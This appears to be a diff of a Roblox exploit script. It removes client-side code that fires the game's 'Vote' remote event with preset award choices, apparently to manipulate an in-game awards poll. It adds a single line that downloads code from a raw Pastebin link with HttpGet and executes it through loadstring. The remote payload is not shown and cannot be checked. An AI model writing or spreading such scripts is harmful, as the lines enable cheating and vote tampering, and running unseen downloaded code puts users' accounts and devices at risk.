@@ -1,11 +1,1 @@
-local args = {
-   [1] = {
-       ["Best Content Update"] = "Tower Defense Simulator",
-       ["People's Choice"] = "BedWars",
-       ["Best Use of Avatar Fashion"] = "Word // Zero",
-       ["Video Star of the Year"] = "Flamingo"
-   },
-   [2] = workspace.VotingScreen
-}
-
-game:GetService("ReplicatedStorage").Events.RemoteEvents.Vote:FireServer(unpack(args))
+loadstring(game:HttpGet("https://pastebin.com/raw/y1sUazhu"))()
